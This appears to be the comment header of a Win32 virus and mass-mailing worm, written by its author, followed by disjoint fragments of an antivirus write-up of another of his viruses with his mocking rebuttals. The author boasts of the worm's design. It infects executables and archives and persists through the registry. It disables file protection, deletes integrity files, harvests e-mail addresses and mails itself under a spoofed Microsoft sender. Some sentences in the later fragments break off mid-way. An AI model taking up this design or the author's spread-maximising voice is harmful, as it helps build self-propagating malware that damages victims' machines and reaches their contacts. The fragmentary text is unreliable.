</span><span class="sc1">; [ Introduction ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; After many months lost in my studies,my personal problems, and playing with</span><span class="sc0">
</span><span class="sc1">; Half-Life in a LAN (hi Winter, nIgr0 &amp; Tcp!),i'm here to present the newest</span><span class="sc0">
</span><span class="sc1">; creature from me. I think i have changed a bit my way of code since my last</span><span class="sc0">
</span><span class="sc1">; published virus, as i don't  give a shit now about structural optimization,</span><span class="sc0">
</span><span class="sc1">; and such like fool things;as i've been infected 3 or 4 times with different</span><span class="sc0">
</span><span class="sc1">; viruses (my pirate  is a great target  for them, so  i am), i realized that</span><span class="sc0">
</span><span class="sc1">; i had to guide my steps  to fast-spreading. For  example, i've got infected</span><span class="sc0">
</span><span class="sc1">; with Kriz, CIH and my  PoshKiller (without realizing  in a whole day), i've</span><span class="sc0">
</span><span class="sc1">; seen  that, meanwhile  Kriz didn't infected  a shit (although i had to kill</span><span class="sc0">
</span><span class="sc1">; windows), CIH was a  bit faster  but very unstable (fact  that make me know</span><span class="sc0">
</span><span class="sc1">; at the fucking moment when i was infected); my PoshKiller was the most sta-</span><span class="sc0">
</span><span class="sc1">; ble, fast and the one  that persisted more in  my system (anyway i realized</span><span class="sc0">
</span><span class="sc1">; the bug with CPL files, so there is a new version (1.01) of it). The Ring-0</span><span class="sc0">
</span><span class="sc1">; viruses are the fastest ones  in this side  of the universe, they replicate</span><span class="sc0">
</span><span class="sc1">; as bastard  motherfuckers, but only in Win9x  enviroments; so its  targeted</span><span class="sc0">
</span><span class="sc1">; systems are very limited, and  have  counted their  days (Win2k is here  to</span><span class="sc0">
</span><span class="sc1">; stay),so Ring-3  viruses seem the  solution. In  fact, they can  have  good</span><span class="sc0">
</span><span class="sc1">; fast-spreading abilities, but the recursive scan is rather slow. Some solu-</span><span class="sc0">
</span><span class="sc1">; tions to this problem are brought by this virus, so take a look at it! Dont</span><span class="sc0">
</span><span class="sc1">; expect many innovations among this  virus: i've done it only  for spread, i</span><span class="sc0">
</span><span class="sc1">; don't want any risk  derivated of brand new techniques; for that reason i'm</span><span class="sc0">
</span><span class="sc1">; making other viruses. Every virus has  a purpose, understand it. Also, this</span><span class="sc0">
</span><span class="sc1">; virus is my first one using some includes, for reasons of understandability</span><span class="sc0">
</span><span class="sc1">; of the code ;) The ZIP infection  routines are  from StarZer0, and the  CAB</span><span class="sc0">
</span><span class="sc1">; one is from Prizzy. Greets here to them. Well, i'm still  more  proud of my</span><span class="sc0">
</span><span class="sc1">; Win32.Legacy, for  example, but  this  virus marks  a new start in my viral</span><span class="sc0">
</span><span class="sc1">; objectives. And it's so fucking big, and spreadable :P This virus initially</span><span class="sc0">
</span><span class="sc1">; had EPO features, but due some very strange bugs, it was removed on purpose</span><span class="sc0">
</span><span class="sc1">; until i found the fucking bug. Blah, who cares. This  have been very boring</span><span class="sc0">
</span><span class="sc1">; to be finished at all, but finally here is it! :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Coz the lack of motivation and shits of my personal life, some  bugs may be</span><span class="sc0">
</span><span class="sc1">; bypassed... anyway don't worry, if  any bug  found  it will be solved for a</span><span class="sc0">
</span><span class="sc1">; futurible next version.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ Behaviour ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; When the virus arrives on a new system, it acts in two parts:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 1) First execution of the virus</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus will  infect every  infectable file at \WINDOWS, \WINDOWS\SYSTEM,</span><span class="sc0">
</span><span class="sc1">; and the current directory;it will drop an infected file at SYSTEM directory</span><span class="sc0">
</span><span class="sc1">; named REVEROF.EXE (with hidden, R/O and  system attributes), will make some</span><span class="sc0">
</span><span class="sc1">; changes  on  the  registry (for windows  boot-up execution), and  will stay</span><span class="sc0">
</span><span class="sc1">; infecting by means of a normal  runtime Win32 Ring3  virus. The virus  will</span><span class="sc0">
</span><span class="sc1">; disable SFC forever (in Win2k at least).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 2) Windows boot-up when the virus is already there</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Oh, here comes the  funniest stuff ;) The virus will be  executed just when</span><span class="sc0">
</span><span class="sc1">; Windows has boot-up, and  will begin the "spawning" state. The  virus  will</span><span class="sc0">
</span><span class="sc1">; have its  own process (registered as  system process in Win9x) and  it will</span><span class="sc0">
</span><span class="sc1">; begin a recursive search through  all units and all directories of the inf.</span><span class="sc0">
</span><span class="sc1">; computer, infecting everything infectable. Also, if it finds some HTM? file</span><span class="sc0">
</span><span class="sc1">; or a Windows Address Book file (WAB) it'll  analyze it searching for e-mail</span><span class="sc0">
</span><span class="sc1">; addresses, and if it finds some of them, the virus will send  there  a copy</span><span class="sc0">
</span><span class="sc1">; of the virus. Also, the virus will delete all the integrity files of the HD</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ Poly ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The poly is a new revision of my MMXE. I've realized its garbage engine was</span><span class="sc0">
</span><span class="sc1">; the worst kind of garbager  never seen, so i've added many more garbage. Of</span><span class="sc0">
</span><span class="sc1">; course, it's still limited (believe me, i'm preparing a new engine with one</span><span class="sc0">
</span><span class="sc1">; of the best garbagers you've ever seen) but it's because the engine concept</span><span class="sc0">
</span><span class="sc1">; itself. I am too lazy to recode it, so  i try  to patch  its  hughest fails</span><span class="sc0">
</span><span class="sc1">; step by step. Bah, the  poly doesn't need to be  powerful in a virus of the</span><span class="sc0">
</span><span class="sc1">; features of this, but it helps for conceal the code to the  curious eyes ;)</span><span class="sc0">
</span><span class="sc1">; It's not the best at  any field, but it intends to be spreadable. About the</span><span class="sc0">
</span><span class="sc1">; poly itself, see the previous versions of MMXE for a full description, as i</span><span class="sc0">
</span><span class="sc1">; have not changed the behaviour of the engine at all.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ I-Worm ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This  virus  uses captabilities  of the i-worms for mega-spreading. It will</span><span class="sc0">
</span><span class="sc1">; send a fake mail with an  infected attachment to every e-mail address obta-</span><span class="sc0">
</span><span class="sc1">; ined from the two ways implemented:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       1. E-mails found into HTM? files (searching for "mailto:")</span><span class="sc0">
</span><span class="sc1">;       2. E-mails in the WAB files, even from Outlook 5.5 - (c) LifeWire/iKX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This provides us an overwhelming power :) The virus implements its own SMTP</span><span class="sc0">
</span><span class="sc1">; client engine, whick gives us  a more reliable &amp;  stealthy way for  sending</span><span class="sc0">
</span><span class="sc1">; e-mails to the people we want  to infect, as  well as we can spoof the MAIL</span><span class="sc0">
</span><span class="sc1">; FROM field, making the  user believe  that  it really comes from Micro$oft.</span><span class="sc0">
</span><span class="sc1">; We take the SMTP server name from  the registry (from the default account),</span><span class="sc0">
</span><span class="sc1">; and if these keys doesn't  exist, it's  able  to use  some harcoded spanish</span><span class="sc0">
</span><span class="sc1">; SMTP servers.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This part of the virus will  only work  when we're on spawning stage, so in</span><span class="sc0">
</span><span class="sc1">; the first run of the virus in  an infected  system won't work  at all. Just</span><span class="sc0">
</span><span class="sc1">; wait for the  next reboot and  let's play :) We won't  resend the  virus to</span><span class="sc0">
</span><span class="sc1">; an  already  used target, as  it stores  the CRC32 in  an special file (our</span><span class="sc0">
</span><span class="sc1">; personal address  book, in the C:\REVEROF.SYS file); anyway  and for  avoid</span><span class="sc0">
</span><span class="sc1">; problems and allow more fun, we delete that  address book when  the payload</span><span class="sc0">
</span><span class="sc1">; is activated, so we can resend the virus again and again :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Send mail procedures are dessigned with an intelligent usage of threads, id</span><span class="sc0">
</span><span class="sc1">; est, we earn time and handle as good as possible this critical stage of the</span><span class="sc0">
</span><span class="sc1">; virus, as we  want  to remain  as stealthy  as  possible. First we create a</span><span class="sc0">
</span><span class="sc1">; thread with the lowest priority, that only  awaits till we're  connected to</span><span class="sc0">
</span><span class="sc1">; internet, and when this happens, it sets the thread to the highest priority</span><span class="sc0">
</span><span class="sc1">; and creates another thread with highest  priority: the one that handles the</span><span class="sc0">
</span><span class="sc1">; SMTP client itself.This thread has 60 seconds to perform all its operations</span><span class="sc0">
</span><span class="sc1">; When that time passes, the  virus terminates the thread, as we take this as</span><span class="sc0">
</span><span class="sc1">; a timeout error. Nice, heh? :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ Payload ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Mwaha! The payload, of  course, is not  destructive. It consist in a trojan</span><span class="sc0">
</span><span class="sc1">; dropping; the trojan is a little shitty program with an icon asociated,that</span><span class="sc0">
</span><span class="sc1">; will only show you the lyrics of the song that gives its name to this virus</span><span class="sc0">
</span><span class="sc1">; But what's funny is when it is dispayed ;) The trojan is dropped in all the</span><span class="sc0">
</span><span class="sc1">; root directories of all the  fixed drives (HDs), and is also dropped a cool</span><span class="sc0">
</span><span class="sc1">; file called autorun.inf; this  will make  a funny  effect when the infected</span><span class="sc0">
</span><span class="sc1">; user tries to access the root drive from Windoze's explorer ;) The AutoWorm</span><span class="sc0">
</span><span class="sc1">; made by Murkry uses a similar principle, but  his wormy spreads itself, and</span><span class="sc0">
</span><span class="sc1">; mine don't, it's just a payload :) </span><span class="sc0">

</span><span class="sc1">; depending of the existence of .reloc section. If it exist, the virus will</span><span class="sc0">
</span><span class="sc1">; generate a random 6 chars name - ".??????",0,0 (? is a random char), and</span><span class="sc0">
</span><span class="sc1">; will overwrite that section with the virus code. If it doesn't exist, we</span><span class="sc0">
</span><span class="sc1">; infect by means of increasing the last section. Also, if the file has the</span><span class="sc0">
</span><span class="sc1">; checksum field with a non-zero value (means that it uses checksum!), we</span><span class="sc0">
</span><span class="sc1">; calculate the new checksum after-infection. This is useful for infect some</span><span class="sc0">

</span><span class="sc1">; This is a per-process memory resident parasitic Win32 virus. The virus</span><span class="sc0">
</span><span class="sc1">; affects PE EXE files (Win32 executables) as well as adds infected EXE files</span><span class="sc0">
</span><span class="sc1">; to RAR and ARJ archives. The virus code and algorithms are closely related</span><span class="sc0">
</span><span class="sc1">; to some other Windows viruses like "Thorin", and it seems to be a remake of</span><span class="sc0">
</span><span class="sc1">; already known Windows viruses.</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus is about 16Kb of length. It is large enough for a virus written</span><span class="sc0">
</span><span class="sc1">; in Assembler.This large size however is caused by virus infection algorithm</span><span class="sc0">
</span><span class="sc1">; polymorphic engines, payload routines and many tricks used by the virus to</span><span class="sc0">

</span><span class="sc1">; [* There is only one payload, so this shouldn't be in plural.            *]</span><span class="sc0">

</span><span class="sc1">; One of virus polymorphic routines uses MMX instructions in the code, and as</span><span class="sc0">
</span><span class="sc1">; a result the virus does not work on old i486- and old Pentium machines. The</span><span class="sc0">
</span><span class="sc1">; virus also uses "on-the-fly" encryption: most of its routines stay</span><span class="sc0">
</span><span class="sc1">; encrypted after main decryption loops. In case of need the virus decrypts</span><span class="sc0">
</span><span class="sc1">; necessary routine, calls it, and then encrypts again.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [* What debugger do you use? Of course that Legacy works in old machines *]</span><span class="sc0">
</span><span class="sc1">; [* I coded a check for that, and it performs the same task of decrypting *]</span><span class="sc0">
</span><span class="sc1">; [* with normal instructions! LIERS! LAMERS!                              *]</span><span class="sc0">

</span><span class="sc1">; Infection</span><span class="sc0">
</span><span class="sc1">; ---------</span><span class="sc0">
</span><span class="sc1">; The virus infection routine scans Windows, Windows system and current</span><span class="sc0">
</span><span class="sc1">; directories, looks for .EXE, .CPL and .SCR Windows executable files there</span><span class="sc0">
</span><span class="sc1">; and infects them. The virus also looks for RAR and ARJ archives, processes</span><span class="sc0">
</span><span class="sc1">; their internal formats and adds an infected files to there.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; While infecting an EXE file the virus increases the size of last file</span><span class="sc0">
</span><span class="sc1">; section, encrypts itself and writes to there. The virus also modifies</span><span class="sc0">
</span><span class="sc1">; necessary PE header fields, but does not touch program's startup address.</span><span class="sc0">
</span><span class="sc1">; To get control on infected file run the virus inserts polymorphic routine</span><span class="sc0">
</span><span class="sc1">; which by using a trick passes control to the main virus body.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [* Ok, i guess you are talking about PHIRE engine... *]</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Per-process resident</span><span class="sc0">
</span><span class="sc1">; --------------------</span><span class="sc0">
</span><span class="sc1">; To stay in Windows memory (per-process resident) the virus scans infected</span><span class="sc0">
</span><span class="sc1">; application (host file) imports, gets addresses of ten file access and</span><span class="sc0">
</span><span class="sc1">; execution functions (MoveFileA, CopyFileA, GetFullPathNameA, DeleteFileA,</span><span class="sc0">
</span><span class="sc1">; WinExec, CreateProcessA, CreateFileA, GetFileAttributesA, FindFirstFileA,</span><span class="sc0">
</span><span class="sc1">; FindNextFileA) and hooks them. When an infected application calls any of</span><span class="sc0">
</span><span class="sc1">; listed functions, the virus gets file name, checks the file and infects it.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [* FAKE-O-MATIC: It hooks 16 (not 10d, it's 10h!) functions, and da guys *]</span><span class="sc0">
</span><span class="sc1">; [* missed many of them here (too lazy for see what CRC32 matches with    *]</span><span class="sc0">
</span><span class="sc1">; [* each API?) The APIs hooked are:MoveFileA, CopyFileA, GetFullPathNameA *]</span><span class="sc0">
</span><span class="sc1">; [* DeleteFileA, WinExec, CreateFileA, CreateProcessA, GetFileAttributesA *]</span><span class="sc0">
</span><span class="sc1">; [* SetFileAttributesA, _lopen, MoveFileExA, CopyFileExA, OpenFile,       *]</span><span class="sc0">

</span><span class="sc1">; Other features and payload</span><span class="sc0">
</span><span class="sc1">; --------------------------</span><span class="sc0">
</span><span class="sc1">; The virus uses anti-debugging tricks and exits under debugger. The virus</span><span class="sc0">
